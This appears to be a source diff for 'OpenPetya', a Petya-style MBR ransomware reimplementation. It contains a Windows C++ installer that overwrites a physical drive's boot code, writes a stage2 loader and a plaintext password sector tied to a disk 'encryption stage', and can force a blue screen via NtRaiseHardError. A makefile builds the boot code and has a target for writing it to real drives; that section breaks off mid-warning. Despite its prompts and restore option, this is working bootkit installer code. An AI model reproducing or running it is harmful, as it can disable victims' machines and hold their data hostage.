+    std::wcout << "\nAvailable physical drives:\n";
+    std::wcout << std::left << std::setw(6) << L"#" << std::setw(12) << "Size" <<  L"Mode\n";
+    std::wcout  << L"------------------------------------------\n";
+
+    for (const auto& drive : lsDrives)
+    {
+        double gb = static_cast<double>(drive.uSizeBytes) / (1024 * 1024 * 1024);
+        std::wstringstream ss;
+        ss << std::fixed << std::setprecision(1) << gb << L" GB";
+        std::wcout << std::left << std::setw(6) << (L"[" + std::to_wstring(drive.nIndex) + L"]") << std::setw(12) << ss.str() << drive.szModel << L'\n';
+    }
+}
+
+/// @brief 
+/// @param szPath 
+/// @param abBuffer 
+/// @return 
+bool fnbReadFile(const std::string& szPath, std::vector<uint8_t>& abBuffer)
+{
+    std::ifstream fs(szPath, std::ios::binary | std::ios::ate);
+    if (!fs)
+    {
+        std::cerr << "\tCannot open file: " << szPath << "\n";
+        return false;
+    }
+
+    size_t nSize = (size_t)fs.tellg();
+    fs.seekg(0);
+    abBuffer.resize(nSize);
+
+    if (!fs.read(reinterpret_cast<char*>(abBuffer.data()), nSize))
+    {
+        std::cerr << "\tRead error: " << szPath << "\n";
+        return false;
+    }
+
+    return true;
+}
+
+/// @brief 
+/// @param abBuffer 
+void fnPadToSector(std::vector<uint8_t>& abBuffer)
+{
+    size_t rem = abBuffer.size() % SECTOR_SIZE;
+    if (rem != 0)
+        abBuffer.resize(abBuffer.size() + SECTOR_SIZE - rem, 0);
+}
+
+/// @brief 
+/// @param abMBR 
+/// @return 
+bool fnbValidateMBR(const std::vector<uint8_t>& abMBR)
+{
+    if (abMBR.size() < SECTOR_SIZE)
+        return false;
+
+    return abMBR[510] == 0x55 && abMBR[511] == 0xAA;
+}
+
+/// @brief 
+/// @param szDrivePath 
+/// @param szOutPath 
+/// @return 
+bool fnbBackupMBR(const std::wstring& szDrivePath, const std::string& szOutPath)
+{
+    std::wcout << L"\n[Backup MBR] Reading sector 0...\n";
+    
+    clsDiskHandle disk;
+    if (!disk.fnbOpen(szDrivePath, false))
+        return false;
+
+    std::vector<uint8_t> abMBR;
+    if (!disk.fnbReadSectors(0, 1, abMBR))
+        return false;
+
+    std::cout   << "Boot signature: "
+                << std::hex << (int)abMBR[510] << " " << (int)abMBR[511]
+                << std::dec << "\n";
+
+    std::cout   << "Partition table (0x1BE):\n";
+    for (int i = 0; i < 4; i++)
+    {
+        uint8_t* e = abMBR.data() + 0x1BE + i * 16;
+        uint8_t type = e[4];
+        uint32_t lba = *(uint32_t *)(e + 8);
+        uint32_t sector = *(uint32_t *)(e + 12);
+
+        if (type == 0)
+            continue;
+
+        std::cout << "\t[" << i << "] type=0x" << std::hex << (int)type << " lba=" << std::dec << lba << " sectors=" << sector;
+
+        if (type == 0x07)
+            std::cout << " (NTFS)";
+        if (type == 0x0B || type == 0x0C)
+            std::cout << " (FAT32)";
+        if (type == 0x05 || type == 0x0F)
+            std::cout << " (Extended)";
+        if (type == 0x83)
+            std::cout << " (Linux)";
+
+        std::cout << "\n";
+    }
+
+    // Write to file
+    std::ofstream fs(szOutPath, std::ios::binary);
+    if (!fs)
+    {
+        std::cerr << "Cannot create backup file: " << szOutPath << "\n";
+        return false;
+    }
+
+    fs.write(reinterpret_cast<char*>(abMBR.data()), abMBR.size());
+    std::cout << "Saved to: " << szOutPath << "\n";
+
+    return true;
+}
+
+/// @brief 
+/// @param szDrivePath 
+/// @return 
+bool fnbSaveChainloadBackup(const std::wstring& szDrivePath)
+{
+    std::cout << "\n[Chainload backup] Saving original MBR to sector " << BACKUP_MBR_SECTOR << "...\n";
+
+    clsDiskHandle disk;
+    if (!disk.fnbOpen(szDrivePath, true))
+        return false;
+
+    // Read sector 0
+    std::vector<uint8_t> abMBR;
+    if (!disk.fnbReadSectors(0, 1, abMBR))
+        return false;
+
+    if (!fnbValidateMBR(abMBR))
+    {
+        std::cerr << "Warning: no 0x55AA signature in sector 0\n";
+    }
+
+    // Write original MBR to sector 63
+    if (!disk.fnbWriteSectors(BACKUP_MBR_SECTOR, abMBR))
+        return false;
+
+    std::cout << "Original MBR is successfully saved to sector " << BACKUP_MBR_SECTOR << "\n";
+    
+    return true;
+}
+
+/// @brief 
+/// @param szDrivePath 
+/// @param szMbrPath 
+/// @return 
+bool fnbWriteMBR(const std::wstring& szDrivePath, const std::string& szMbrPath)
+{
+    std::cout << "\n[Write MBR] Installing custom boot code...\n";
+
+    // Read custom MBR binary file
+    std::vector<uint8_t> abMBR;
+    if (!fnbReadFile(szMbrPath, abMBR))
+        return false;
+
+    if (!fnbValidateMBR(abMBR))
+    {
+        std::cerr << "Error: " << szMbrPath << " has no 0x55 signature!\n";
+        return false;
+    }
+
+    std::cout << "Custom MBR: " << szMbrPath << "(" << abMBR.size() << ")\n";
+
+    clsDiskHandle disk;
+    if (!disk.fnbOpen(szDrivePath, true))
+        return false;
+
+    // Read current MBR from disk because we need the partition table
+    std::vector<uint8_t> abDiskMBR;
+    if (!disk.fnbReadSectors(0, 1, abDiskMBR))
+        return false;
+
+    // Merge the custom boot code (446 bytes) + disk's partition table (64 bytes) + 0x55AA
+    std::vector<uint8_t> abMerged(SECTOR_SIZE);
+
+    // Copy the boot code (byte 0 to 445)
+    memcpy(abMerged.data(), abMBR.data(), MBR_BOOT_CODE_SIZE);
+
+    // Keep original partition table (bytes 446-509)
+    memcpy(abMerged.data() + 0x1BE, abDiskMBR.data() + 0x1BE, 64);
+
+    // Boot signature (byte 510-511)
+    abMerged[510] = 0x55;
+    abMerged[511] = 0xAA;
+
+    // Overwrite
+    if (!disk.fnbWriteSectors(0, abMerged))
+        return false;
+
+    std::cout << "Boot code is written (446 bytes), partition table is preserved.\n";
+    std::cout << "Boot signature: 0x55 0xAA\n";
+
+    return true;
+}
+
+/// @brief 
+/// @param szDrivePath 
+/// @param szStage2Path 
+/// @return 
+bool fnbWriteStage2(const std::wstring& szDrivePath, const std::string& szStage2Path)
+{
+    std::cout << "\n[Write Stage2] Installing Stage2 bootloader...\n";
+
+    std::vector<uint8_t> abStage2;
+    if (!fnbReadFile(szStage2Path, abStage2))
+        return false;
+
+    fnPadToSector(abStage2);
+
+    DWORD sectors = (DWORD)(abStage2.size() / SECTOR_SIZE);
+    
+    printf("Stage2: %s (%d bytes, sectors %d)\n", szStage2Path, abStage2.size(), sectors);
+    printf("Writing to sectors %d-%d...\n", STAGE2_START_SECTOR, STAGE2_START_SECTOR + sectors + 1);
+
+    clsDiskHandle disk;
+    if (!disk.fnbOpen(szDrivePath, true))
+        return false;
+
+    if (!disk.fnbWriteSectors(STAGE2_START_SECTOR, abStage2))
+        return false;
+
+    std::cout << "Stage2 is successfulyl written.\n";
+
+    return true;
+}
+
+/// @brief 
+/// @param szDrivePath 
+/// @param szBackupFile 
+/// @return 
+bool fnbRestoreMBR(const std::wstring& szDrivePath, const std::string& szBackupFile)
+{
+    std::cout << "\n[Restore MBR] Restoring original MBR...\n";
+    std::vector<uint8_t> abBackup;
+
+    if (!fnbReadFile(szBackupFile, abBackup))
+    {
+        std::cerr << "\nRead backup file failed!\n";
+        return false;
+    }
+
+    if (abBackup.size() < SECTOR_SIZE)
+    {
+        std::cerr << "\tBackup file too small!\n";
+        return false;
+    }
+
+    if (!fnbValidateMBR(abBackup))
+    {
+        std::cerr << "\tWarning: backup has no 0x55AA signature.\n";
+    }
+
+    fnPadToSector(abBackup);
+    abBackup.resize(SECTOR_SIZE);
+
+    clsDiskHandle disk;
+    if (!disk.fnbOpen(szDrivePath, true))
+        return false;
+
+    if (!disk.fnbWriteSectors(0, abBackup))
+        return false;
+
+    std::cout << "\tOriginal MBR is restored successfully.\n";
+
+    return true;
+}
+
+/// @brief 
+/// @param szDrivePath 
+/// @return 
+bool fnbValidate(const std::wstring& szDrivePath)
+{
+    std::cout << "\n[Validate] Reading disk...\n";
+
+    clsDiskHandle disk;
+    if (!disk.fnbOpen(szDrivePath, false))
+        return false;
+
+    std::vector<uint8_t> abMBR;
+    if (!disk.fnbReadSectors(0, 1, abMBR))
+        return false;
+
+    std::cout << "\n\tMBR (sector 0) first 64 bytes:\n";
+    fnHexdump(abMBR.data(), 64, 0);
+
+    std::cout << "\n\tBoot sigature: 0x" << std::hex << (int)abMBR[510] << " 0x" << (int)abMBR[511] << std::dec;
+    if (abMBR[510] == 0x55 && abMBR[511] == 0xAA)
+        std::cout << " (valid)\n";
+    else
+        std::cout << " (INVALID)\n";
+
+    std::cout << "\n\tPartition table:\n";
+    for (int i = 0; i < 4; i++)
+    {
+        uint8_t *e = abMBR.data() + 0x1BE + i * 16;
+        uint8_t type = e[4];
+        uint32_t lba = *(uint32_t *)(e + 8);
+        uint32_t sector = *(uint32_t *)(e + 12);
+
+        if (type == 0)
+            continue;
+
+        std::cout   << "\t[" << i << "] type=0x" << std::hex << (int)type << " lba=" << std::dec << lba << " sectors=" << sector;
+
+        if (type == 0x07)
+            std::cout << " (NTFS)";
+        if (type == 0x08 || type == 0x0C)
+            std::cout << " (FAT32)";
+
+        std::cout << "\n";
+    }
+
+    // Check sector 63 (chainload backup)
+    std::vector<uint8_t> abBackup;
+    if (disk.fnbReadSectors(BACKUP_MBR_SECTOR, 1, abBackup))
+        std::cout << "\n\tSector " << BACKUP_MBR_SECTOR << " (chainload backup) signature: 0x" << std::hex << (int)abBackup[510] << "0x" << (int)abBackup[511] << std::dec << "\n";
+
+    return true;
+}
+
+/// @brief 
+/// @param szMsg 
+/// @return 
+bool fnbConfirm(const std::string& szMsg)
+{
+    std::cout << "\n " << szMsg << " (yes/no): ";
+    std::string szAns;
+    std::getline(std::cin, szAns);
+
+    return szAns == "yes" || szAns == "YES" || szAns == "y";
+}
+
+/// @brief 
+/// @param szDrivePath 
+/// @return 
+UINT64 fnGetDiskTotalSectors(const std::wstring& szDrivePath)
+{
+    HANDLE hFile = CreateFileW(
+        szDrivePath.c_str(),
+        GENERIC_READ,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        nullptr,
+        OPEN_EXISTING,
+        0,
+        nullptr
+    );
+
+    if (INVALID_HANDLE_VALUE == hFile)
+        return 0;
+
+    DISK_GEOMETRY_EX geo = {};
+    DWORD ret = 0;
+    DeviceIoControl(hFile, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, nullptr, 0, &geo, sizeof(geo), &ret, nullptr);
+    CloseHandle(hFile);
+
+    return (UINT64)geo.DiskSize.QuadPart / 512;
+}
+
+/// @brief 
+/// @param szDrivePath 
+/// @param nTotalSectors 
+/// @return 
+bool fnbWriteDiskSize(const std::wstring& szDrivePath, UINT64 nTotalSectors)
+{
+    std::cout << "\n[Write disk size] Sectors: " << nTotalSectors << "\n";
+
+    clsDiskHandle disk;
+    if (!disk.fnbOpen(szDrivePath, true))
+        return false;
+
+    std::vector<uint8_t> abStateSector(SECTOR_SIZE, 0);
+
+    uint32_t magic = 0x424F4F54UL;
+    memcpy(abStateSector.data(), &magic, 4);
+    abStateSector[4] = 0x00;
+    memcpy(abStateSector.data() + 8, &nTotalSectors, 8);
+
+    if (!disk.fnbWriteSectors(60, abStateSector))
+        return false;
+
+    // Verify
+    std::vector<uint8_t> abCheck;
+    if (!disk.fnbReadSectors(60, 1, abCheck))
+        return false;
+
+    uint32_t read_magic = *(uint32_t *)(abCheck.data() + 0);
+    uint64_t read_size  = *(uint64_t *)(abCheck.data() + 8);
+
+    printf("\tVerify: magic=0x%08X state=0x%02X disk_sectors=%llu\n", read_magic, abCheck[4], read_size);
+
+    if (read_magic != 0x424F4F54UL || read_size != nTotalSectors)
+    {
+        std::cerr << "\tERROR: State sector verify FAILED!\n";
+        return false;
+    }
+
+    std::cout << "\tState sector OK.\n";
+    return true;
+}
+
+/// @brief 
+/// @param szPrompt 
+/// @return 
+std::string fnInputPassword(const std::string& szPrompt)
+{
+    std::cout << szPrompt;
+
+    std::string szPass;
+    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
+    DWORD mode = 0;
+    GetConsoleMode(hStdin, &mode);
+
+    // Disable echo
+    SetConsoleMode(hStdin, mode & ~ENABLE_ECHO_INPUT);
+
+    char ch;
+    DWORD read = 0;
+    while (ReadConsoleA(hStdin, &ch, 1, &read, nullptr))
+    {
+        if (ch == '\r')
+        {
+            // consume '\n'
+            ReadConsoleA(hStdin, &ch, 1, &read, nullptr);
+            break;
+        }
+
+        if (ch == '\b' && !szPass.empty())
+        {
+            szPass.pop_back();
+            std::cout << "\b \b";
+        }
+        else if (ch != '\b')
+        {
+            szPass += ch;
+            std::cout << '*';
+        }
+    }
+
+    // Restore echo
+    SetConsoleMode(hStdin, mode);
+    std::cout << "\n";
+
+    return szPass;
+}
+
+/// @brief Write password plain text into disk, this password will be erased during the encryption stage
+/// @param szDrivePath 
+/// @param szPassword 
+/// @return 
+bool fnbWritePassword(const std::wstring& szDrivePath, const std::string& szPassword)
+{
+    std::cout << "\n[Write password] Storing to sector 59...\n";
+
+    if (szPassword.empty())
+    {
+        std::cerr << "\tError: password cannot be empty.\n";
+        return false;
+    }
+
+    if (szPassword.size() > 64)
+    {
+        std::cerr << "\tError: password is too long (max 64 chars)\n";
+        return false;
+    }
+
+    clsDiskHandle disk;
+    if (!disk.fnbOpen(szDrivePath, true))
+        return false;
+
+    // Build sector
+    std::vector<uint8_t> abSector(SECTOR_SIZE, 0);
+
+    // magic
+    uint32_t magic = 0x50415353UL; // "PASS"
+    memcpy(abSector.data(), &magic, 4);
+
+    // length
+    abSector[4] = (uint8_t)szPassword.size();
+
+    // password bytes
+    memcpy(abSector.data() + 5, szPassword.data(), szPassword.size());
+
+    if (!disk.fnbWriteSectors(59, abSector))
+        return false;
+
+    std::cout << "\tPassword is written to sector 59.\n";
+    std::cout << "\tIt will be erased by bootloader after first boot.\n";
+
+    // Zero password string from memory.
+    volatile char *p = (volatile char *)szPassword.data();
+    for (size_t i = 0; i < szPassword.size(); i++)
+        p[i] = 0;
+
+    return true;
+}
+
+/// @brief Clear metadata (sectors 59-63)
+/// @param szDrivePath 
+/// @return 
+bool fnbClearMetadata(const std::wstring& szDrivePath)
+{
+    std::cout << "\n[Clear metadata] Wiping sectors 59-63...\n";
+
+    clsDiskHandle disk;
+    if (!disk.fnbOpen(szDrivePath, true))
+        return false;
+
+    std::vector<uint8_t> abZero(SECTOR_SIZE, 0);
+    for (int s = 59; s < 64; s++)
+    {
+        if (!disk.fnbWriteSectors(s, abZero))
+        {
+            return false;
+        }
+    }
+
+    std::cout << "\tDone.\n";
+
+    return true;
+}
+
+void fnPrintBanner()
+{
+    std::cout << R"(
+       ___     _ __                     ___            _       _  _          
+      / _ \   | '_ \   ___    _ _      | _ \   ___    | |_    | || |  __ _   
+     | (_) |  | .__/  / -_)  | ' \     |  _/  / -_)   |  _|    \_, | / _` |  
+      \___/   |_|__   \___|  |_||_|   _|_|_   \___|   _\__|   _|__/  \__,_|  
+    _|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_| """"|_|"""""| 
+    "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
+        )" << std::endl;
+
+    std::cout << "OpenPetya v1.0.0" << std::endl;
+    std::cout << "Author: iss4cf0ng/ISSAC" << std::endl;
+    std::cout << "GitHub: https://github.com/iss4cf0ng/OpenPetya/" << std::endl;
+}
+
+/// @brief Print usage
+/// @param szProg Application name (File name)
+void fnPrintUsage(const char* szProg)
+{
+    fnPrintBanner();
+
+    std::wcout  << "\nUsage: " << szProg << " [options]\n\n"
+                << "Options:\n"
+                << "\t--list                            List physical drives\n"
+                << "\t--drive N                         Select PhysicalDriveN\n"
+                << "\t--install <mbr.bin> <stage.bin>   Full installation\n"
+                << "\t--backup-mbr <file>               Backup MBR to specified output file\n"
+                << "\t--save-chainload                  Save MBR to sector 63\n"
+                << "\t--write-mbr                       Write MBR boot code\n"
+                << "\t--write-stage2                    Write Stage2\n"
+                << "\t--restore-mbr                     Restore original MBR\n"
+                << "\t--validate                        Show disk state\n"
+                << "\t--bsod                            Raise BSOD via NtRaiseHardError()"
+                << "\nExamples:\n"
+                << "\tOpenPetya.exe --list\n"
+                << "\tOpenPetya.exe --drive 1 --backup-mbr\n"
+                << "\tOpenPetya.exe --drive 1 --install mbr.bin stage2.bin\n"
+                << "\tOpenPetya.exe --drive 1 --restore-mbr original_mbr.bin\n"
+                << "\tOpenPetya.exe --drive 1 --validate\n\n";
+}
+
+int _tmain(int argc, char *argv[])
+{
+    if (argc < 2)
+    {
+        fnPrintUsage(argv[0]);
+        return 1;
+    }
+
+    int nIdxDrive = -1;
+    bool bList = false;
+    bool bBackup = false;
+    bool bChainload = false;
+    bool bWriteMBR = false;
+    bool bWriteStage2 = false;
+    bool bRestore = false;
+    bool bValidate = false;
+    bool bInstall = false;
+
+    std::string szBackupPath;
+    std::string szMbrPath;
+    std::string szStage2Path;
+    std::string szRestorePath;
+
+    for (int i = 1; i < argc; i++)
+    {
+        std::string arg = argv[i];
+
+        if (arg == "--h" || arg == "--help")
+        {
+            fnPrintUsage(argv[0]);
+            return 0;
+        }
+        if (arg == "--list")
+        {
+            bList = true;
+        }
+        else if (arg == "--drive" && i + 1 < argc)
+        {
+            nIdxDrive = std::stoi(argv[++i]);
+        }
+        else if (arg == "--backup-mbr" && i + 1 < argc)
+        {
+            bBackup = true;
+            szBackupPath = argv[++i];
+        }
+        else if (arg == "--save-chainload")
+        {
+            bChainload = true;
+        }
+        else if (arg == "--write-mbr" && i + 1 < argc)
+        {
+            bWriteMBR = true;
+            szMbrPath = argv[++i];
+        }
+        else if (arg == "--write-stage2" && i + 1 < argc)
+        {
+            bWriteStage2 = true;
+            szStage2Path = argv[++i];
+        }
+        else if (arg == "--restore-mbr" && i + 1 < argc)
+        {
+            bRestore = true;
+            szRestorePath = argv[++i];
+        }
+        else if (arg == "--validate")
+        {
+            bValidate = true;
+        }
+        else if (arg == "--install" && i + 2 < argc)
+        {
+            bInstall = true;
+            szMbrPath = argv[++i];
+            szStage2Path = argv[++i];
+        }
+        else if (arg == "--bsod")
+        {
+            printf("Continue? (yes/no): ");
+            std::string szAns;
+            std::getline(std::cin, szAns);
+
+            if (szAns != "yes" && szAns != "y")
+            {
+                printf("Cancelled.\n");
+                return 0;
+            }
+
+            // Hell Yeahhhhhhh!
+            HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+            auto RtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(ntdll, "RtlAdjustPrivilege");
+            auto NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");
+
+            if (!RtlAdjustPrivilege)
+            {
+                std::cout << "Failed to get export address of NtlAdjustPrivilege!" << std::endl;
+                return 1;
+            }
+
+            if (!NtRaiseHardError)
+            {
+                std::cout << "Failed to get export address of NtRaiseHardError!" << std::endl;
+                return 1;
+            }
+
+            ULONG response = 0;
+            BOOLEAN enabled;
+            NTSTATUS status;
+
+            status = RtlAdjustPrivilege(19, TRUE, FALSE, &enabled);
+            if (status != 0)
+            {
+                std::cout << "RtlAdjustPrivilege failed: 0x" << std::hex << status << std::endl;
+                return 1;
+            }
+
+            status = NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, nullptr, 6, &response);
+
+            std::cout << "Status: " << std::hex << status << std::endl;
+        }
+        else
+        {
+            std::cerr << "Unknown option: " << arg << std::endl;
+            fnPrintUsage(argv[0]);
+
+            return 1;
+        }
+    }
+
+    // List drives (no specified drive need)
+    if (bList)
+    {
+        auto drives = fnListDrives();
+        if (drives.empty())
+        {
+            std::wcout << L" No drives found (need Administrator?)\n";
+            return 1;
+        }
+
+        fnPrintDrives(drives);
+
+        return 0;
+    }
+
+    // All other operations need --drive
+    if (nIdxDrive < 0)
+    {
+        std::wcerr << L"Error: --drive N is required\n";
+        fnPrintUsage(argv[0]);
+
+        return 1;
+    }
+
+    std::wstring szDrivePath = L"\\\\.\\PhysicalDrive" + std::to_wstring(nIdxDrive);
+    std::wcout << L"\nTarget drive: " << szDrivePath << L"\n";
+
+    // --install: full workflow
+    bool bRet = true;
+    if (bInstall)
+    {
+        std::cout << "\nFull Install\n";
+        std::cout << "\tMBR file: " << szMbrPath << "\n";
+        std::cout << "\tStage2 file: " << szStage2Path << "\n";
+
+        UINT64 nTotalSectors = fnGetDiskTotalSectors(szDrivePath);
+        if (nTotalSectors == 0)
+        {
+            std::cerr << "Cannot get disk size!\n";
+            return 1;
+        }
+
+        printf("\tDisk: %d sectors (%d MB)\n", nTotalSectors, nTotalSectors / 2048);
+        printf("\tHidden backup will be at sector %d\n\n", nTotalSectors - 30);
+
+        std::string szPass1, szPass2;
+        while (true)
+        {
+            szPass1 = fnInputPassword("Set bootloader password: ");
+            szPass2 = fnInputPassword("Confirm password: ");
+
+            if (szPass1 == szPass2 && !szPass1.empty())
+                break;
+
+            if (szPass1.empty())
+                std::cerr << "Error: Password cannot be empty.\n\n";
+            else
+                std::cerr << "Error: Passwords do not match, try again\n\n";
+        }
+
+        std::cout << "Password set.\n";
+
+        printf("\nThis will modify PhysicalDrive%d.\n", nIdxDrive);
+        printf("Partition table will be preserved.\n");
+        printf("Continue? (yes/no): ");
+        std::string szAns;
+        std::getline(std::cin, szAns);
+
+        if (szAns != "yes" && szAns != "y")
+        {
+            printf("Cancelled.\n");
+
+            // Zero password
+            for (char& c : szPass1)
+                c = 0;
+            for (char& c : szPass2)
+                c = 0;
+
+            return 0;
+        }
+
+        if (!fnbClearMetadata(szDrivePath)) {
+            std::cerr << "FAILED: ClearMetadata\n";
+            return 1;
+        }
+        szBackupPath = "original_mbr_" + std::to_string(nIdxDrive) + ".bin";
+        if (!fnbBackupMBR(szDrivePath, szBackupPath)) {
+            std::cerr << "FAILED: BackupMBR\n";
+            return 1;
+        }
+        if (!fnbSaveChainloadBackup(szDrivePath)) {
+            std::cerr << "FAILED: SaveChainload\n";
+            return 1;
+        }
+        if (!fnbWriteMBR(szDrivePath, szMbrPath)) {
+            std::cerr << "FAILED: WriteMBR\n";
+            return 1;
+        }
+        if (!fnbWriteStage2(szDrivePath, szStage2Path)) {
+            std::cerr << "FAILED: WriteStage2\n";
+            return 1;
+        }
+        if (!fnbWriteDiskSize(szDrivePath, nTotalSectors)) {
+            std::cerr << "FAILED: WriteDiskSize\n";
+            return 1;
+        }
+        if (!fnbWritePassword(szDrivePath, szPass1)) {
+            std::cerr << "FAILED: WritePassword\n";
+            return 1;
+        }
+
+        for (char& c: szPass1)
+            c = 0;
+        for (char& c: szPass2)
+            c = 0;
+
+        // Validation
+        if (bRet)
+            fnbValidate(szDrivePath);
+
+        std::cout << "Installation is " << (bRet ? "completed!" : "FAILED!") << "\n";
+
+        if (bRet)
+        {
+            std::cout << "\nBackup is saved to: " << szBackupPath << "\n";
+            std::cout << "To restore: OpenPetya.exe --drive " << nIdxDrive << " --restore-mbr " << szBackupPath << "\n";
+        }
+
+        return (int)bRet;
+    }
+
+    // Individual operations
+    if (bBackup)
+        bRet = bRet && fnbBackupMBR(szDrivePath, szBackupPath);
+
+    if (bChainload)
+        bRet = bRet && fnbSaveChainloadBackup(szDrivePath);
+
+    if (bWriteMBR)
+        bRet = bRet && fnbWriteMBR(szDrivePath, szMbrPath);
+
+    if (bWriteStage2)
+        bRet = bRet && fnbWriteStage2(szDrivePath, szStage2Path);
+
+    if (bRestore)
+        bRet = bRet && fnbRestoreMBR(szDrivePath, szRestorePath);
+
+    if (bValidate)
+        bRet = bRet && fnbValidate(szDrivePath);
+
+    return (int)bRet;
+}
+```
+
+`makefile`:
+
+```
+NASM := nasm
+CC   := gcc
+LD   := ld
+QEMU := qemu-system-i386
+
+MBR_DIR := mbr
+BL_DIR  := bootloader
+BUILD   := build
+
+MBR_BIN  := $(BUILD)/mbr.bin
+STAGE2   := $(BUILD)/stage2.bin
+DISK_IMG := $(BUILD)/disk.img
+
+SRCS     := $(wildcard $(BL_DIR)/*.c)
+OBJS     := $(patsubst $(BL_DIR)/%.c, $(BUILD)/%.o, $(SRCS))
+ALL_OBJS := $(BUILD)/entry.o $(OBJS)
+
+DISK_SIZE_MB := 200
+PART_START   := 1MiB
+PART_END     := 199MiB
+
+CFLAGS  := -m32 -ffreestanding -nostdlib -nostartfiles -fno-stack-protector -fno-pic -O2 -Wall -Wextra
+LDFLAGS := -m elf_i386 -T $(BL_DIR)/linker.ld
+
+.PHONY: all build img clean run run-debug dirs img-info write-drive backup-mbr restore-mbr
+
+all: build
+	@echo ""
+	@echo "[+] Build completed successfully."
+	@echo "[*] Next steps:"
+	@echo "\tsudo make img                     -> Create NTFS disk image"
+	@echo "\tmake run                          -> Launch QEMU test environment"
+	@echo "\tmake write-drive DRIVE=/dev/sdX   -> Deploy bootloader to physical drive"
+
+# -----------------------------------------------------------------------------
+# Core Build Pipeline (No sudo required)
+# -----------------------------------------------------------------------------
+build: dirs $(MBR_BIN) $(STAGE2)
+	@echo "[+] Bootloader build pipeline finished."
+
+dirs:
+	@mkdir -p $(BUILD)
+	@echo "[*] Created build workspace: $(BUILD)"
+
+$(MBR_BIN): $(MBR_DIR)/mbr.asm
+	@echo "[*] Assembling MBR stage..."
+	$(NASM) -f bin -o $@ $<
+	@[ $$(wc -c < $@) -eq 512 ] && echo "[+] Valid MBR generated (512 bytes)." || (echo "[-] MBR size validation failed!" && exit 1)
+
+$(BUILD)/entry.o: $(BL_DIR)/entry.asm
+	@echo "[*] Assembling Stage2 entry point..."
+	$(NASM) -f elf32 -o $@ $<
+
+$(BUILD)/%.o: $(BL_DIR)/%.c
+	@echo "[*] Compiling $< ..."
+	$(CC) $(CFLAGS) -c -o $@ $<
+
+$(STAGE2): $(ALL_OBJS)
+	@echo "[*] Linking Stage2 payload..."
+	$(LD) -m elf_i386 -T $(BL_DIR)/linker.ld -o $@ --oformat binary $^
+
+	@size=$$(stat -c%s $@); \
+	if [ $$size -lt 20480 ]; then \
+		echo "[*] Padding Stage2 to 8192 bytes..."; \
+		dd if=/dev/zero bs=1 count=$$((20480-$$size)) >> $@ 2>/dev/null; \
+	fi
+
+	@echo "[+] Stage2 payload ready: $$(stat -c%s $@) bytes"
+
+# =============================================================================
+# Disk Image Generation (Requires sudo)
+# =============================================================================
+img: $(MBR_BIN) $(STAGE2)
+	@[ "$$(id -u)" = "0" ] || (echo "[-] Root privileges required. Use: sudo make img" && exit 1)
+
+	@echo ""
+	@echo "[*] Initializing NTFS disk image build sequence..."
+
+	@echo "[*] [1/5] Allocating $(DISK_SIZE_MB)MB raw disk image..."
+	dd if=/dev/zero of=$(DISK_IMG) bs=1M count=$(DISK_SIZE_MB) 2>/dev/null
+
+	@echo "[*] [2/5] Writing MBR partition table..."
+	parted -s $(DISK_IMG) mklabel msdos
+	parted -s $(DISK_IMG) mkpart primary ntfs $(PART_START) $(PART_END)
+
+	@echo "[*] [3/5] Formatting NTFS partition..."
+	@LOOP=$$(losetup --find --show --partscan $(DISK_IMG)); \
+	echo "[*] Attached loop device: $$LOOP"; \
+	sleep 1; \
+	mkfs.ntfs -Q -L "BOOTDISK" $${LOOP}p1; \
+	EXIT=$$?; \
+	losetup -d $$LOOP; \
+	[ $$EXIT -eq 0 ] && echo "[+] NTFS filesystem created successfully." || (echo "[-] NTFS formatting failed!" && exit 1)
+
+	@echo "[*] [4/5] Injecting MBR boot code..."
+	dd if=$(MBR_BIN) of=$(DISK_IMG) bs=446 count=1 conv=notrunc 2>/dev/null
+
+	@echo "[*] [5/5] Deploying Stage2 loader to sector 1..."
+	dd if=$(STAGE2) of=$(DISK_IMG) seek=1 bs=512 conv=notrunc 2>/dev/null
+
+	@echo "[*] Writing state sector (sector 60) for QEMU..."
+	python3 -c "import struct,sys; s=bytearray(512); struct.pack_into('<I',s,0,0x424F4F54); s[4]=0x00; struct.pack_into('<Q',s,8,200*1024*2); sys.stdout.buffer.write(bytes(s))" | dd of=$(DISK_IMG) seek=60 bs=512 count=1 conv=notrunc 2>/dev/null
+
+	@echo "[*] Writing password sector (sector 59) for QEMU testing..."
+	python3 -c "import struct,sys; s=bytearray(512); struct.pack_into('<I',s,0,0x50415353); pw=b'123456'; s[4]=len(pw); s[5:5+len(pw)]=pw; sys.stdout.buffer.write(bytes(s))" | dd of=$(DISK_IMG) seek=59 bs=512 count=1 conv=notrunc 2>/dev/null
+
+	@echo ""
+	@echo "[+] Disk image successfully generated: $(DISK_IMG)"
+	@parted -s $(DISK_IMG) print
+
+# =============================================================================
+# QEMU Execution
+# =============================================================================
+run: $(DISK_IMG)
+	@echo "[*] Launching QEMU virtual machine..."
+	$(QEMU) -drive file=$(DISK_IMG),format=raw,if=ide -m 128M -no-reboot -no-shutdown -display gtk -serial stdio
+
+run-debug: $(DISK_IMG)
+	@echo "[*] Launching QEMU in debug mode..."
+	$(QEMU) -drive file=$(DISK_IMG),format=raw,if=ide -m 128M -no-reboot -no-shutdown -display gtk -serial stdio -s -S
+
+# =============================================================================
+# Physical Drive Deployment
+# Usage: make write-drive DRIVE=/dev/sdb
+# =============================================================================
+write-drive: $(MBR_BIN) $(STAGE2)
+ifndef DRIVE
+	@echo ""
+	@echo "[-] ERROR: No target drive specified."
+	@echo "[*] Example usage: make write-drive DRIVE=/dev/sdb"
+	@echo ""
+	@echo "[*] Available block devices:"
+	@lsblk -d -o NAME,SIZE,MODEL | grep -v loop
+	@exit 1
+endif
+
+	@echo ""
+	@echo "[*] Preparing deployment to $(DRIVE)..."
+	@echo ""
+	@echo "[*] Current partition layout:"
+	@sudo parted $(DRIVE) print
+
+	@echo ""
+	@echo "[-] WARNING:"
+	@echo "\tThis operation overwrites:"
+	@echo "\t\t- MBR boot code (first 446 bytes)"
+	@echo "\t\t- Stage2 loader (sector 1)"
+	@echo ""
